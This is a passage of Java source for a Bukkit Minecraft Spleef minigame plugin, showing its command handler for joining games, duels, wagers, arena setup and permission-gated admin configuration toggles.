package fr.naruse.spleef.v1_12.cmd;

import com.google.common.collect.Lists;
import com.sk89q.worldedit.Vector;
import com.sk89q.worldedit.bukkit.selections.Selection;
import fr.naruse.spleef.common.Reflections;
import fr.naruse.spleef.manager.SpleefPluginV1_12;
import fr.naruse.spleef.v1_12.api.SpleefAPIEventInvoker;
import fr.naruse.spleef.v1_12.api.event.cancellable.SpleefCancellableWithReasonEvent;
import fr.naruse.spleef.v1_12.api.event.cancellable.reason.SpleefCommandPerformedEvent;
import fr.naruse.spleef.v1_12.game.spleef.SpleefGameMode;
import fr.naruse.spleef.v1_12.game.spleef.Spleef;
import fr.naruse.spleef.v1_12.util.Message;
import fr.naruse.spleef.v1_12.util.board.Holograms;
import org.bukkit.Bukkit;
import org.bukkit.Material;
import org.bukkit.block.Block;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.command.TabExecutor;
import org.bukkit.entity.Player;

import java.util.List;

public class SpleefCommands implements CommandExecutor, TabExecutor {
    private SpleefPluginV1_12 pl;
    public SpleefCommands(SpleefPluginV1_12 spleefPlugin) {
        this.pl = spleefPlugin;
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String ss, String[] args) {
        if(sender instanceof Player){
            Player p = (Player) sender;

            SpleefCancellableWithReasonEvent scwre;
            if(new SpleefAPIEventInvoker(scwre = new SpleefCommandPerformedEvent(pl, p, command, ss, args)).isCancelled()){
                if(scwre.getReason() != null){
                    sendMessage(sender, "§c"+scwre.getReason());
                }
                return false;
            }

            if(args.length == 0){
                if(!p.hasPermission("spleef.deny.join") || p.isOp()){
                    sendMessage(sender, "§3Hey! §6/§cspleef join <Spleef Name>");
                }
                sendMessage(sender, "§3Hey! §6/§cspleef leave");
                if(!p.hasPermission("spleef.deny.wager") || p.isOp()){
                    sendMessage(sender, "§3Hey! §6/§cspleef wager <Open, Decline, Accept, Wager> <[Player]>");
                }
                if(!p.hasPermission("spleef.deny.duel") || p.isOp()){
                    sendMessage(sender, "§3Hey! §6/§cspleef duel <Invite, Decline, Accept> <[Player]>");
                }
            }
            if(args.length != 0){
                if(args[0].equalsIgnoreCase("duel")){
                    if(p.hasPermission("spleef.deny.duel") && !p.isOp()){
                        return sendMessage(sender, Message.COMMAND_PROHIBITED.getMessage());
                    }
                    if(args.length < 2){
                        return sendMessage(sender, "§3Hey! §6/§cspleef duel <Invite, Decline, Accept> <[Player]>");
                    }
                    if(args[1].equalsIgnoreCase("invite")){
                        if(args.length < 3){
                            return sendMessage(sender, "§3Hey! §6/§cspleef duel Invite <Player>");
                        }
                        Player target = Bukkit.getPlayer(args[2]);
                        if(target == null){
                            return sendMessage(sender, "§c"+Message.PLAYER_NOT_FOUND.getEnglishMessage());
                        }
                        return pl.duels.invite(p, target);
                    }
                    if(args[1].equalsIgnoreCase("decline")){
                        pl.duels.decline(p, true);
                        return true;
                    }
                    if(args[1].equalsIgnoreCase("accept")){
                        return pl.duels.acceptDuel(p);
                    }
                    return false;
                }
                if(args[0].equalsIgnoreCase("join")){
                    if(p.hasPermission("spleef.deny.join") && !p.isOp()){
                        return sendMessage(sender, Message.COMMAND_PROHIBITED.getMessage());
                    }
                    if(args.length < 2){
                        return sendMessage(sender, "§3Hey! §6/§cspleef join <Spleef Name>");
                    }
                    for(Spleef spleef : pl.spleefs.getSpleefs()){
                        if(spleef.getName().equalsIgnoreCase(args[1])){
                            pl.spleefs.addPlayer(p, spleef);
                            return true;
                        }
                    }
                    return sendMessage(sender, "§c"+Message.SPLEEF_NOT_FOUND.getMessage());
                }
                //WAGER START
                if(args[0].equalsIgnoreCase("wager")){
                    if(p.hasPermission("spleef.deny.wager") && !p.isOp()){
                        return sendMessage(sender, Message.COMMAND_PROHIBITED.getMessage());
                    }
                    if(args.length < 2){
                        return sendMessage(sender, "§3Hey! §6/§cspleef wager <Open, Decline, Accept, Wager> <[Player]>");
                    }
                    if(args[1].equalsIgnoreCase("open")){
                        if(pl.wagers.getWagerOfPlayer().containsKey(p)){
                            pl.wagers.getWagerOfPlayer().get(p).openInventory(p);
                            return true;
                        }else{
                            return sendMessage(sender, "§c"+Message.YOU_DO_NOT_HAVE_A_WAGER.getMessage());
                        }
                    }
                    if(args[1].equalsIgnoreCase("Wager")){
                        if(args.length < 3){
                            return sendMessage(sender, "§3Hey! §6/§cspleef wager <Open, Decline, Accept, Wager> <[Player]>");
                        }
                        Player target = Bukkit.getPlayer(args[2]);
                        if(target == null){
                            return sendMessage(sender, "§c"+Message.PLAYER_NOT_FOUND.getMessage());
                        }
                        if(pl.spleefs.hasSpleef(p) || pl.spleefs.hasSpleef(target)){
                            return sendMessage(sender, "§c"+Message.ONE_PLAYER_HAS_A_GAME.getMessage());
                        }
                        if(!pl.wagers.createWager(p, target)){
                            return sendMessage(sender, "§c"+Message.THIS_PLAYER_HAS_WAGER.getMessage());
                        }
                        target.sendMessage(Message.SPLEEF.getMessage()+" §a"+Message.WAGER_RECEIVED_BY.getMessage()+" §6"+p.getName()+"§a.");
                        return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+Message.WAGER_SENT.getMessage());
                    }
                    if(args[1].equalsIgnoreCase("accept")){
                        if(pl.wagers.getWagerOfPlayer().containsKey(p)){
                            if(pl.wagers.getWagerOfPlayer().get(p).getPlayer1() == p){
                                return false;
                            }
                            pl.wagers.getWagerOfPlayer().get(p).getPlayer1().sendMessage(Message.SPLEEF.getMessage()+" §a"+Message.WAGER_ACCEPTED.getMessage());
                            pl.wagers.getWagerOfPlayer().get(p).accept();
                            return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+Message.WAGER_ACCEPTED.getMessage());
                        }
                        return true;
                    }
                    if(args[1].equalsIgnoreCase("decline")){
                        if(pl.wagers.getWagerOfPlayer().containsKey(p)){
                            if(pl.wagers.getWagerOfPlayer().get(p).isWagerActive()){
                                return true;
                            }
                            if(pl.wagers.getWagerOfPlayer().get(p).getPlayer1() == p){
                                return false;
                            }
                            pl.wagers.getWagerOfPlayer().get(p).getPlayer1().sendMessage(Message.SPLEEF.getMessage()+" §a"+Message.WAGER_DECLINED.getMessage());
                            pl.wagers.getWagerOfPlayer().get(p).decline();
                            return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+Message.WAGER_DECLINED.getMessage());
                        }
                        return true;
                    }
                    return sendMessage(sender, "§c"+Message.SPLEEF_NOT_FOUND.getMessage());
                }
                //WAGER END
                if(args[0].equalsIgnoreCase("leave")){
                    for(Spleef spleef : pl.spleefs.getSpleefs()){
                        if(spleef.getPlayerInGame().contains(p)){
                            spleef.sendMessage(spleef.getNAME()+" §6"+p.getName()+"§c "+Message.LEAVED_THE_GAME.getMessage());
                            break;
                        }
                    }
                    if(!pl.spleefs.removePlayer(p)){
                        return sendMessage(sender, "§c"+Message.YOU_DONT_HAVE_SPLEEF.getMessage());
                    }
                    return false;
                }
            }
            if(args.length == 0){
                if(hasPermission(p,"spleef.help")){
                    return sendMessage(sender, "§3Hey! §6/§cspleef help");
                }
                return false;
            }
            if(args[0].equalsIgnoreCase("help")){
                if(!hasPermission(p,"spleef.help")){
                    return sendMessage(sender, "§4"+Message.YOU_DONT_HAVE_THIS_PERMISSION.getMessage());
                }
                int page = 1;
                if(args.length > 1){
                    try{
                        page = Integer.valueOf(args[1]);
                    }catch (Exception e){
                        return sendMessage(sender, "§c"+Message.NEED_A_NUMBER.getMessage());
                    }
                }
                return help(sender, page);
            }
            if(args[0].equalsIgnoreCase("create")){
                if(!hasPermission(p,"spleef.create")){
                    return sendMessage(sender, "§4"+Message.YOU_DONT_HAVE_THIS_PERMISSION.getMessage());
                }
                if(args.length < 2){
                    return help(sender, 1);
                }
                SpleefGameMode gameMode = SpleefGameMode.NORMAL;
                int place = 1000;
                for(int i = 0; i != 999; i++){
                    if(pl.getConfig().getString("spleef."+i+".name") == null){
                        place = i;
                    }else if(args[1].equalsIgnoreCase(pl.getConfig().getString("spleef."+i+".name"))){
                        return sendMessage(sender, "§c"+Message.NAME_ALREADY_USED.getMessage());
                    }
                }
                if(place == 1000){
                    return sendMessage(sender, "§c"+Message.TOO_MUCH_SPLEEFS.getMessage());
                }
                if(args.length > 2){
                    gameMode = SpleefGameMode.valueOf(args[2].toUpperCase());
                    if(gameMode == null){
                        return sendMessage(sender,"§c"+Message.SPLEEF_GAME_MODE_NOT_FOUND.getEnglishMessage());
                    }
                }
                pl.getConfig().set("spleef."+place+".name", args[1]);
                pl.getConfig().set("spleef."+place+".isOpen", true);
                pl.getConfig().set("spleef."+place+".gameMode", gameMode.name());
                pl.saveConfig();
                return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+Message.SPLEEF_CREATED.getMessage());
            }
            if(args[0].equalsIgnoreCase("delete")){
                if(!hasPermission(p,"spleef.delete")){
                    return sendMessage(sender, "§4"+Message.YOU_DONT_HAVE_THIS_PERMISSION.getMessage());
                }
                if(args.length < 2){
                    return help(sender, 1);
                }
                int place = 1000;
                for(int i = 0; i != 999; i++){
                    if(args[1].equalsIgnoreCase(pl.getConfig().getString("spleef."+i+".name"))){
                        place = i;
                        break;
                    }
                }
                if(place == 1000){
                    return sendMessage(sender, "§c"+Message.SPLEEF_NOT_FOUND.getMessage());
                }
                pl.getConfig().set("spleef."+place, null);
                pl.saveConfig();
                return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+Message.SPLEEF_DELETED.getMessage());
            }
            if(args[0].equalsIgnoreCase("reload")){
                if(!hasPermission(p,"spleef.reload")){
                    return sendMessage(sender, "§4"+Message.YOU_DONT_HAVE_THIS_PERMISSION.getMessage());
                }
                sendMessage(sender,Message.SPLEEF.getMessage()+" §cReloading...");
                pl.spleefs.reload();
                return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+Message.DONE.getMessage());
            }
            if(args[0].equalsIgnoreCase("set")){
                if(!hasPermission(p,"spleef.set")){
                    return sendMessage(sender, "§4"+Message.YOU_DONT_HAVE_THIS_PERMISSION.getMessage());
                }
                if(args.length < 2){
                   return help(sender, 1);
                }
                if(args[1].equalsIgnoreCase("command")){
                    if(args.length < 4){
                        return help(sender, 3);
                    }
                    String result = " ";
                    for(int i = 3; i != args.length; i++){
                        result += " "+args[i];
                    }
                    result = result.replace("  ", "");
                    if(args[2].equalsIgnoreCase("start")){
                        pl.getConfig().set("commands.start", result);
                        pl.saveConfig();
                        return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+Message.SETTING_SAVED.getMessage()+" §7(Command.Start: "+result+")");
                    }
                    if(args[2].equalsIgnoreCase("end")){
                        pl.getConfig().set("commands.end", result);
                        pl.saveConfig();
                        return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+Message.SETTING_SAVED.getMessage()+" §7(Command.End: "+result+")");
                    }
                }
                if(args[1].equalsIgnoreCase("scoreboard")){
                    pl.getConfig().set("scoreboard.enable", !pl.getConfig().getBoolean("scoreboard.enable"));
                    pl.saveConfig();
                    return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+Message.SETTING_SAVED.getMessage()+" §7(Scoreboard: "+pl.getConfig().getBoolean("scoreboard.enable")+")");
                }
                if(args[1].equalsIgnoreCase("holograms")){
                    if(args.length < 3){
                        return help(sender, 3);
                    }
                    if(args[2].equalsIgnoreCase("location")){
                        pl.getConfig().set("holograms.location.x", p.getLocation().getX());
                        pl.getConfig().set("holograms.location.y", p.getLocation().getY());
                        pl.getConfig().set("holograms.location.z", p.getLocation().getZ());
                        pl.getConfig().set("holograms.location.world", p.getLocation().getWorld().getName());
                        pl.saveConfig();
                        pl.holograms.removeLeaderBoard();
                        pl.holograms = new Holograms(pl);
                        return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+ Message.LOCATION_SAVED.getMessage());
                    }
                    if(args[2].equalsIgnoreCase("enable")){
                        pl.getConfig().set("holograms.enable", !pl.getConfig().getBoolean("holograms.enable"));
                        pl.saveConfig();
                        pl.holograms.removeLeaderBoard();
                        pl.holograms = new Holograms(pl);
                        return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+ Message.SETTING_SAVED.getMessage());
                    }
                }
                if(args[1].equalsIgnoreCase("glowing")){
                    pl.getConfig().set("gameMode.team.glowing", !pl.getConfig().getBoolean("gameMode.team.glowing"));
                    pl.saveConfig();
                    return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+Message.SETTING_SAVED.getMessage()+" §7(Glowing: "+pl.getConfig().getBoolean("gameMode.team.glowing")+")");
                }
                if(args[1].equalsIgnoreCase("rewards")){
                    if(args.length < 4){
                        return help(sender, 2);
                    }
                    if(args[2].equalsIgnoreCase("command")){
                        if(args[3].equalsIgnoreCase("null")){
                            pl.getConfig().set("rewards.command", "null");
                            pl.saveConfig();
                            return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+Message.SETTING_SAVED.getMessage()+" §7(Rewards.command deleted)");
                        }
                        String result = " ";
                        for(int i = 3; i != args.length; i++){
                            result += " "+args[i];
                        }
                        pl.getConfig().set("rewards.command", result.replace("  ", ""));
                        pl.saveConfig();
                        return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+Message.SETTING_SAVED.getMessage()+" §7(Rewards.command:"+result+")");
                    }
                    double d;
                    try{
                        d = Double.valueOf(args[3]);
                    }catch (Exception e){
                        return sendMessage(sender, "§c"+Message.NEED_A_NUMBER.getMessage());
                    }
                    if(args[2].equalsIgnoreCase("win")){
                        pl.getConfig().set("rewards.win", d);
                        pl.saveConfig();
                        return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+Message.NUMBER_SAVED.getMessage()+" §7(Rewards.win: "+d+")");
                    }
                    if(args[2].equalsIgnoreCase("lose")){
                        pl.getConfig().set("rewards.lose", d);
                        pl.saveConfig();
                        return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+Message.NUMBER_SAVED.getMessage()+" §7(Rewards.lose: "+d+")");
                    }
                    return false;
                }
                if(args[1].equalsIgnoreCase("lang")){
                    if(args.length < 3){
                        return help(sender, 1);
                    }
                    if(args[2].equalsIgnoreCase("french")){
                        pl.getConfig().set("lang", "french");
                        pl.saveConfig();
                        pl.configurations.getMessages().clearConfiguration();
                        pl.configurations.getMessages().generateConfig(false);
                        return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+Message.LANG_SAVED.getMessage());
                    }
                    if(args[2].equalsIgnoreCase("dutch")){
                        pl.getConfig().set("lang", "dutch");
                        pl.saveConfig();
                        pl.configurations.getMessages().clearConfiguration();
                        pl.configurations.getMessages().generateConfig(false);
                        return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+Message.LANG_SAVED.getMessage());
                    }
                    if(args[2].equalsIgnoreCase("english")){
                        pl.getConfig().set("lang", "english");
                        pl.saveConfig();
                        pl.configurations.getMessages().clearConfiguration();
                        pl.configurations.getMessages().generateConfig(false);
                        return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+Message.LANG_SAVED.getMessage());
                    }
                    if(args[2].equalsIgnoreCase("custom")){
                        pl.getConfig().set("lang", "custom");
                        pl.saveConfig();
                        pl.configurations.getMessages().clearConfiguration();
                        pl.configurations.getMessages().generateConfig(false);
                        return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+Message.LANG_SAVED.getMessage());
                    }
                    if(args[2].equalsIgnoreCase("spanish")){
                        pl.getConfig().set("lang", "spanish");
                        pl.saveConfig();
                        pl.configurations.getMessages().clearConfiguration();
                        pl.configurations.getMessages().generateConfig(false);
                        return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+Message.LANG_SAVED.getMessage());
                    }
                    if(args[2].equalsIgnoreCase("polish")){
                        pl.getConfig().set("lang", "polish");
                        pl.saveConfig();
                        pl.configurations.getMessages().clearConfiguration();
                        pl.configurations.getMessages().generateConfig(false);
                        return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+Message.LANG_SAVED.getMessage());
                    }
                    return false;
                }
                if(args[1].equalsIgnoreCase("time")){
                    if(args.length < 4){
                        return help(sender, 1);
                    }
                    int time;
                    try{
                        time = Integer.valueOf(args[3]);
                    }catch (Exception e){
                        return sendMessage(sender, "§c"+Message.NEED_A_NUMBER.getMessage());
                    }
                    if(args[2].equalsIgnoreCase("wait")){
                        pl.getConfig().set("times.wait", time);
                        pl.saveConfig();
                        return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+Message.NUMBER_SAVED.getMessage()+ "§7 (Wait: "+time+")");
                    }
                    if(args[2].equalsIgnoreCase("beforeMelt")){
                        pl.getConfig().set("gameMode.melt.beforeMelt", time);
                        pl.saveConfig();
                        return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+Message.NUMBER_SAVED.getMessage()+ "§7 (TimeBeforeMelt: "+time+")");
                    }
                    if(args[2].equalsIgnoreCase("betweenMelt")){
                        pl.getConfig().set("gameMode.melt.betweenMelt", time);
                        pl.saveConfig();
                        return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+Message.NUMBER_SAVED.getMessage()+ "§7 (betweenMelt: "+time+")");
                    }
                    return false;
                }
                if(args.length < 3){
                    return help(sender, 1);
                }
                int place = 1000;
                for(int i = 0; i != 999; i++){
                    if(pl.getConfig().getString("spleef."+i+".name") != null){
                        if(args[2].equalsIgnoreCase(pl.getConfig().getString("spleef."+i+".name"))){
                            place = i;
                            break;
                        }
                    }
                }
                if(place == 1000){
                    return sendMessage(sender, "§c"+Message.SPLEEF_NOT_FOUND.getMessage());
                }
                if(args[1].equalsIgnoreCase("gameMode")){
                    String name = args[3].toUpperCase();
                    SpleefGameMode gameMode = SpleefGameMode.valueOf(name);
                    if(gameMode == null){
                        return sendMessage(sender, "§c"+Message.SPLEEF_GAME_MODE_NOT_FOUND.getMessage());
                    }
                    pl.getConfig().set("spleef."+place+".gameMode", gameMode.name());
                    pl.saveConfig();
                    return sendMessage(sender, Message.SPLEEF.getMessage()+"§a "+Message.SETTING_SAVED.getMessage());
                }
                if(args[1].equalsIgnoreCase("region")){
                    if(pl.worldEditPlugin == null){
                        return sendMessage(sender, "§c"+Message.NEEDS_WE.getMessage());
                    }
                    Selection selection = Reflections.getSelection(pl.getSpleefPlugin(), p);
                    if(selection == null) {
                        return sendMessage(sender, "§cNo selection found.");
                    }
                    Vector min = selection.getNativeMinimumPoint();
                    Vector max = selection.getNativeMaximumPoint();
                    Block block = selection.getWorld().getBlockAt(min.getBlockX(), min.getBlockY(), min.getBlockZ());
                    pl.getConfig().set("spleef."+place+".region.a.x", block.getX());
                    pl.getConfig().set("spleef."+place+".region.a.y", block.getY());
                    pl.getConfig().set("spleef."+place+".region.a.z", block.getZ());
                    pl.getConfig().set("spleef."+place+".region.a.world", block.getWorld().getName());
                    block = selection.getWorld().getBlockAt(max.getBlockX(), max.getBlockY(), max.getBlockZ());
                    pl.getConfig().set("spleef."+place+".region.b.x", block.getX());
                    pl.getConfig().set("spleef."+place+".region.b.y", block.getY());
                    pl.getConfig().set("spleef."+place+".region.b.z", block.getZ());
                    pl.getConfig().set("spleef."+place+".region.b.world", block.getWorld().getName());
                    pl.saveConfig();
                    return sendMessage(sender, Message.SPLEEF.getMessage()+"§a "+Message.REGION_SAVED.getMessage());
                }
                if(args[1].equalsIgnoreCase("min")){
                    if(args.length < 4){
                        return help(sender, 1);
                    }
                    int min;
                    try{
                        min = Integer.valueOf(args[3]);
                        if(min <= 1){
                            return sendMessage(sender, "§c"+Message.GREATER_THAN_1.getMessage());
                        }
                    }catch (Exception e){
                        return sendMessage(sender, "§c"+Message.NEED_A_NUMBER.getMessage());
                    }
                    pl.getConfig().set("spleef."+place+".min", min);
                    pl.saveConfig();
                    return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+Message.NUMBER_SAVED.getMessage());
                }
                if(args[1].equalsIgnoreCase("max")){
                    if(args.length < 4){
                        return help(sender, 1);
                    }
                    int max;
                    try{
                        max = Integer.valueOf(args[3]);
                        if(max <= 1){
                            return sendMessage(sender, "§c"+Message.GREATER_THAN_1.getMessage());
                        }
                    }catch (Exception e){
                        return sendMessage(sender, "§c"+Message.NEED_A_NUMBER.getMessage());
                    }
                    pl.getConfig().set("spleef."+place+".max", max);
                    pl.saveConfig();
                    return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+Message.NUMBER_SAVED.getMessage());
                }
                if(args[1].equalsIgnoreCase("arena")){
                    pl.getConfig().set("spleef."+place+".spleef.x", p.getLocation().getX());
                    pl.getConfig().set("spleef."+place+".spleef.y", p.getLocation().getY());
                    pl.getConfig().set("spleef."+place+".spleef.z", p.getLocation().getZ());
                    pl.getConfig().set("spleef."+place+".spleef.yaw", p.getLocation().getYaw());
                    pl.getConfig().set("spleef."+place+".spleef.pitch", p.getLocation().getPitch());
                    pl.getConfig().set("spleef."+place+".spleef.world", p.getLocation().getWorld().getName());
                    pl.saveConfig();
                    return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+ Message.LOCATION_SAVED.getMessage());
                }
                if(args[1].equalsIgnoreCase("spawn")){
                    pl.getConfig().set("spleef."+place+".spawn.x", p.getLocation().getX());
                    pl.getConfig().set("spleef."+place+".spawn.y", p.getLocation().getY());
                    pl.getConfig().set("spleef."+place+".spawn.z", p.getLocation().getZ());
                    pl.getConfig().set("spleef."+place+".spawn.yaw", p.getLocation().getYaw());
                    pl.getConfig().set("spleef."+place+".spawn.pitch", p.getLocation().getPitch());
                    pl.getConfig().set("spleef."+place+".spawn.world", p.getLocation().getWorld().getName());
                    pl.saveConfig();
                    return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+ Message.LOCATION_SAVED.getMessage());
                }
                if(args[1].equalsIgnoreCase("lobby")){
                    pl.getConfig().set("spleef."+place+".lobby.x", p.getLocation().getX());
                    pl.getConfig().set("spleef."+place+".lobby.y", p.getLocation().getY());
                    pl.getConfig().set("spleef."+place+".lobby.z", p.getLocation().getZ());
                    pl.getConfig().set("spleef."+place+".lobby.yaw", p.getLocation().getYaw());
                    pl.getConfig().set("spleef."+place+".lobby.pitch", p.getLocation().getPitch());
                    pl.getConfig().set("spleef."+place+".lobby.world", p.getLocation().getWorld().getName());
                    pl.saveConfig();
                    return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+ Message.LOCATION_SAVED.getMessage());
                }
            }
            if(args[0].equalsIgnoreCase("open")){
                if(!hasPermission(p,"spleef.open")){
                    return sendMessage(sender, "§4"+Message.YOU_DONT_HAVE_THIS_PERMISSION.getMessage());
                }
                if(args.length < 2){
                    return help(sender, 1);
                }
                int place = 1000;
                for(int i = 0; i != 999; i++){
                    if(pl.getConfig().getString("spleef."+i+".name") != null){
                        if(args[1].equalsIgnoreCase(pl.getConfig().getString("spleef."+i+".name"))){
                            place = i;
                            break;
                        }
                    }
                }
                if(place == 1000){
                    return sendMessage(sender, "§c"+Message.SPLEEF_NOT_FOUND.getMessage());
                }
                for(Spleef spleef : pl.spleefs.getSpleefs()){
                    if(spleef.getName().equalsIgnoreCase(args[1])){
                        spleef.open();
                        pl.getConfig().set("spleef."+place+".isOpen", true);
                        pl.saveConfig();
                        return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+Message.SPLEEF_OPENED.getMessage());
                    }
                }
                return sendMessage(sender, "§c"+Message.SPLEEF_NOT_FOUND.getMessage());
            }
            if(args[0].equalsIgnoreCase("close")){
                if(!hasPermission(p,"spleef.close")){
                    return sendMessage(sender, "§4"+Message.YOU_DONT_HAVE_THIS_PERMISSION.getMessage());
                }
                if(args.length < 2){
                    return help(sender, 1);
                }
                int place = 1000;
                for(int i = 0; i != 999; i++){
                    if(pl.getConfig().getString("spleef."+i+".name") != null){
                        if(args[1].equalsIgnoreCase(pl.getConfig().getString("spleef."+i+".name"))){
                            place = i;
                            break;
                        }
                    }
                }
                if(place == 1000){
                    return sendMessage(sender, "§c"+Message.SPLEEF_NOT_FOUND.getMessage());
                }
                for(Spleef spleef : pl.spleefs.getSpleefs()){
                    if(spleef.getName().equalsIgnoreCase(args[1])){
                        spleef.close();
                        pl.getConfig().set("spleef."+place+".isOpen", false);
                        pl.saveConfig();
                        return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+Message.SPLEEF_CLOSED.getMessage());
                    }
                }
                return sendMessage(sender, "§c"+Message.SPLEEF_NOT_FOUND.getMessage());
            }
            if(args[0].equalsIgnoreCase("list")){
                if(!hasPermission(p,"spleef.list")){
                    return sendMessage(sender, "§4"+Message.YOU_DONT_HAVE_THIS_PERMISSION.getMessage());
                }
                String activeSpleef = ",,", breakdownSpleef = ",,";
                List<String> list = Lists.newArrayList();
                for(Spleef spleef : pl.spleefs.getSpleefs()){
                    activeSpleef += ", "+spleef.getName();
                    list.add(spleef.getName());
                }
                activeSpleef = activeSpleef.replace(",,, ", "");
                for(int i = 0; i != 999; i++){
                    if(pl.getConfig().getString("spleef."+i+".name") != null){
                        if(!list.contains(pl.getConfig().getString("spleef."+i+".name"))){
                            breakdownSpleef += ", "+pl.getConfig().getString("spleef."+i+".name");
                        }
                    }
                }
                breakdownSpleef = breakdownSpleef.replace(",,, ", "");
                if(breakdownSpleef.contains(",,")){
                    breakdownSpleef = "";
                }
                if(activeSpleef.contains(",,")){
                    activeSpleef = "";
                }
                sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+Message.SPLEEF_IN_OPERATION.getMessage()+" §2"+activeSpleef);
                return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+Message.SPLEEF_IN_FAILURE.getMessage()+" §c"+breakdownSpleef);
            }
            if(args[0].equalsIgnoreCase("force")){
                if(!hasPermission(p,"spleef.force")){
                    return sendMessage(sender, "§4"+Message.YOU_DONT_HAVE_THIS_PERMISSION.getMessage());
                }
                if(args.length < 3){
                    return help(sender, 2);
                }
                Spleef spleef = null;
                for(Spleef s : pl.spleefs.getSpleefs()){
                    if(s.getName().equalsIgnoreCase(args[2])){
                        spleef = s;
                        break;
                    }
                }
                if(spleef == null){
                    return sendMessage(sender, "§c"+Message.SPLEEF_NOT_FOUND.getMessage());
                }
                if(args[1].equalsIgnoreCase("start")){
                    if(spleef.getGame().WAIT){
                        if(spleef.getPlayerInGame().size() == 0){
                            return sendMessage(sender, "§c"+Message.NOT_ENOUGH_PLAYER.getMessage());
                        }
                        spleef.start();
                        return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+Message.GAME_START.getMessage());
                    }else{
                        return sendMessage(sender, "§c"+Message.SPLEEF_ALREADY_STARTED.getMessage());
                    }
                }else if(args[1].equalsIgnoreCase("stop")){
                    spleef.restart(false);
                    return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+Message.SPLEEF_STOPPED.getMessage());
                }
            }
            if(args[0].equalsIgnoreCase("allow")){
                if(!hasPermission(p,"spleef.allow")){
                    return sendMessage(sender, "§4"+Message.YOU_DONT_HAVE_THIS_PERMISSION.getMessage());
                }
                if(args.length < 2){
                    return help(sender, 2);
                }
                if(args[1].equalsIgnoreCase("magmaCream")){
                    if(pl.getConfig().getBoolean("allow.magmaCream")){
                        pl.getConfig().set("allow.magmaCream", false);
                        pl.saveConfig();
                        return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+Message.DONE.getMessage()+" §7(MagmaCream: false)");
                    }else{
                        pl.getConfig().set("allow.magmaCream", true);
                        pl.saveConfig();
                        return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+Message.DONE.getMessage()+" §7(MagmaCream: true)");
                    }
                }
                if(args[1].equalsIgnoreCase("showTime")){
                    if(pl.getConfig().getBoolean("allow.showTime")){
                        pl.getConfig().set("allow.showTime", false);
                        pl.saveConfig();
                        return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+Message.DONE.getMessage()+" §7(ShowTime: false)");
                    }else{
                        pl.getConfig().set("allow.showTime", true);
                        pl.saveConfig();
                        return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+Message.DONE.getMessage()+" §7(ShowTime: true)");
                    }
                }
                if(args[1].equalsIgnoreCase("snowballs")){
                    if(pl.getConfig().getBoolean("allow.snowBalls")){
                        pl.getConfig().set("allow.snowBalls", false);
                        pl.saveConfig();
                        return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+Message.DONE.getMessage()+" §7(SnowBalls: false)");
                    }else{
                        pl.getConfig().set("allow.snowBalls", true);
                        pl.saveConfig();
                        return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+Message.DONE.getMessage()+" §7(SnowBalls: true)");
                    }
                }
                if(args[1].equalsIgnoreCase("broadcast")){
                    if(pl.getConfig().getBoolean("allow.broadcast")){
                        pl.getConfig().set("allow.broadcast", false);
                        pl.saveConfig();
                        return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+Message.DONE.getMessage()+" §7(Broadcast: false)");
                    }else{
                        pl.getConfig().set("allow.broadcast", true);
                        pl.saveConfig();
                        return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+Message.DONE.getMessage()+" §7(Broadcast: true)");
                    }
                }
                if(args[1].equalsIgnoreCase("lightning")){
                    if(pl.getConfig().getBoolean("allow.lightning")){
                        pl.getConfig().set("allow.lightning", false);
                        pl.saveConfig();
                        return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+Message.DONE.getMessage()+" §7(Lightning: false)");
                    }else{
                        pl.getConfig().set("allow.lightning", true);
                        pl.saveConfig();
                        return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+Message.DONE.getMessage()+" §7(Lightning: true)");
                    }
                }
                if(args[1].equalsIgnoreCase("goldShovel")){
                    if(pl.getConfig().getBoolean("allow.goldShovel")){
                        pl.getConfig().set("allow.goldShovel", false);
                        pl.saveConfig();
                        return sendMessage(sender, Message.SPLEEF.getMessage()+" §a"+Message.DONE.getMessage()+" §7(GoldShovel: false)");
                    }else{
                        pl.getConfig().set("allow.goldShovel", true);
